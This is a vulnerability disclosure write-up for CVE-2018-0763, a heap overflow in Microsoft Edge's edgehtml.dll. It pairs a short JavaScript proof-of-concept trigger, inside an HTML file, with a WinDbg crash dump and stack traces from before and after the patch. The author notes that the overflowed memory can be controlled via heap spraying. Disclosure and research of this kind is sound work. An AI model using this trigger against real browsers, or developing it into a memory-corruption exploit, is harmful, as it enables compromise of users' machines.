# CVE-2018-0763 | Microsoft Edge heap overflow vulnerability.

```html
<!--

title: 
	(CVE-2018-0763 | MSRC 41548), an heap overflow in edgehtml.dll.
	Severity -   high
	Product  -   MsEdge

adv:
	https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2018-0763
	https://cve.mitre.org/cgi-bin/cvename.cgi?name=2018-0763

repro:
	to reproduce you'll need an edgehtml.dll from before 15//12//17 pt.

ack:
	akayn

================================= trigger.js ==========================================

var a1 = document.createElementNS("http://www.w3.org/2000/svg", "mpath");       (1)                            
a1.style.setProperty("content", "var(-l)");                                     (2)                                                     
var a2 = a1.cloneNode();                                                        (3) 

=======================================================================================

this vuln is very simple, in (1) we create an object to to be allocated in the document, 
this script runs before the document is fully loaded.
in (2) we cast one prop to this object so we initialize one var, notice that -l is undefined,
this should call a partial constructor.  
the main problem is that (3) is called without any validation that a1 points to valid memory,
and before the document is fully constructed ,
and runs CElement::CloneNode:: before edgehtml!CDocument:: ever had the chance to call the edgehtml!Tree::TreeWriter,
to initialize this object's fields.

=========== this is before the fix ==========================:
	(( after some heap feng shui ))

(1f14.320c): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
msvcrt!memcpy+0x2e6:
00007ffb`ff3a31a6 f30f6f4c0ae0    movdqu  xmm1,xmmword ptr [rdx+rcx-20h] ds:000001ea`4a231ff5=????????????????????????????????
0:018> db rcx
000001ea`596a4840  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000001ea`596a4850  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000001ea`596a4860  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000001ea`596a4870  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000001ea`596a4880  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000001ea`596a4890  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000001ea`596a48a0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000001ea`596a48b0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA

	(( partial stack trace ))

 # Child-SP          RetAddr           Call Site
00 0000001f`cbcfacb8 00007ffe`cec0b940 msvcrt!memcpy+0x2e6                                 <<- overflow here..
01 0000001f`cbcfacc0 00007ffe`a56ce525 msvcrt!memcpy_s+0x60
02 0000001f`cbcfad00 00007ffe`a5b3e8b1 edgehtml!CStr::Set+0xa5
03 0000001f`cbcfad40 00007ffe`a5a9ac92 edgehtml!CGeneratedContentExpression::Copy+0x35
04 0000001f`cbcfad80 00007ffe`a5881d59 edgehtml!Tree::SpecifiedStyle::CopyPropertiesFrom+0x218f1e
05 0000001f`cbcfadf0 00007ffe`a567faae edgehtml!Tree::SpecifiedStyle::Clone+0x49
06 0000001f`cbcfae20 00007ffe`a57c01a2 edgehtml!CAttrValue::InitVariant+0x19e
07 0000001f`cbcfae60 00007ffe`a57c0001 edgehtml!CAttrValue::Copy+0x66
08 0000001f`cbcfaeb0 00007ffe`a57bfe92 edgehtml!CAttrArray::Clone+0xf1
09 0000001f`cbcfaf30 00007ffe`a5bc0bda edgehtml!CElement::CloneAttributes+0x42   
0a 0000001f`cbcfaf60 00007ffe`a58610be edgehtml!CCommentElement::CloneAttributes+0x1a
0b 0000001f`cbcfaf90 00007ffe`a5840a00 edgehtml!CElement::Clone+0x1de                            <<- @2                     
0c 0000001f`cbcfb150 00007ffe`a58408d8 edgehtml!Tree::TreeWriter::CloneNode+0x80
0d 0000001f`cbcfb190 00007ffe`a5667a5c edgehtml!Tree::TreeWriter::CloneNodeInternal+0xa4
0e 0000001f`cbcfb1e0 00007ffe`a5667be5 edgehtml!Tree::TreeWriter::CloneTreeInternal+0x134
0f 0000001f`cbcfb220 00007ffe`a5666518 edgehtml!Tree::TreeWriter::CloneTree+0x8d
10 0000001f`cbcfb2a0 00007ffe`a5bcf929 edgehtml!CElement::CloneNodeHelper+0x58      
11 0000001f`cbcfb2d0 00007ffe`a5ca90d8 edgehtml!CDocument::importNode+0x89                       <<- @1

12 0000001f`cbcfb320 00007ffe`a58f8df5 edgehtml!CFastDOM::CDocument::Trampoline_importNode+0xcc              
13 0000001f`cbcfb3e0 00007ffe`ba7ab491 edgehtml!CFastDOM::CDocument::Profiler_importNode+0x25
[...]

=========== this is after the fix ==========================:
	(( partial stack trace ))

 # Child-SP          RetAddr           Call Site
00 00000009`8abf9040 00007ffe`a6a770a2 edgehtml!CAttrArray::Clone+0xf1
01 00000009`8abf90c0 00007ffe`a6ab058e edgehtml!CElement::CloneAttributes+0x42
02 00000009`8abf90f0 00007ffe`a6987f00 edgehtml!CElement::Clone+0x1de                               <<- @2
03 00000009`8abf92b0 00007ffe`a6986ea0 edgehtml!Tree::TreeWriter::CloneNode+0x80
04 00000009`8abf92f0 00007ffe`a65f949a edgehtml!Tree::TreeWriter::CloneNodeInternal+0xa4
05 00000009`8abf9340 00007ffe`a65f9565 edgehtml!Tree::TreeWriter::CloneTreeInternal+0x1f2
06 00000009`8abf9380 00007ffe`a65f6e67 edgehtml!Tree::TreeWriter::CloneTree+0x8d
07 00000009`8abf9400 00007ffe`a6e1f159 edgehtml!CDocument::CloneNodeHelper+0x77
08 00000009`8abf9460 00007ffe`a6ef84b0 edgehtml!CDocument::importNode+0x89                          <<- @1
09 00000009`8abf94b0 00007ffe`a6b48fe5 edgehtml!CFastDOM::CDocument::Trampoline_importNode+0xcc
0a 00000009`8abf9570 00007ffe`a60199f1 edgehtml!CFastDOM::CDocument::Profiler_importNode+0x25
[...]

you can see that the document is first writen and only then cloned by edgehtml!CElement::Clone.

an overflow occurs and the data to be copied points to the document, 
meaning that you got full control over that memory with as little as a simple heap spray.

@_akayn

-->
<script>
var a1 = document.createElementNS("http://www.w3.org/2000/svg", "mpath");                                  
a1.style.setProperty("content", "var(--l)");                                                                                      
var a2 = a1.cloneNode(); 
</script>
```
![](/CVE-2018-0763/poc.PNG)
'a poc that overwrites' a string length'

# links:
<html><a href="https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2018-0763">Microsoft Bulletin</a><html><br>
<html><a href="https://raw.githubusercontent.com/akayn/Bugs/master/CVE-2018-0763/CVE-2018-0763.html">POC</a><html><br>
